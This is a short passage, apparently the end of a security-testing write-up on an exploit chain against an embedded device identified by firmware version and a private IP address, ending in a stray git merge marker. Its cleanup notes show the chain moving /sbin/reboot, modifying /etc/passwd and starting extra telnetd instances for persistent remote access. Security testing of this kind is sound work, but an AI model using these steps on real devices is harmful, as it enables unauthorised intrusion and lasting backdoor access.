**Coverage Evidence:** Full chain confirmed on QPTS-B2209.3.70.CEN001.200707 (OET-213H-NB) at 192.168.30.178.

**Notes:** Restore `/sbin/reboot` if moved during testing (`mv /sbin/reboot.org /sbin/reboot`); clean `/etc/passwd` after testing if modified; disable extra telnetd instances when done. Chain requires network adjacency for UDP spray but yields persistent remote access.
>>>>>>> 4db15a6 (3)
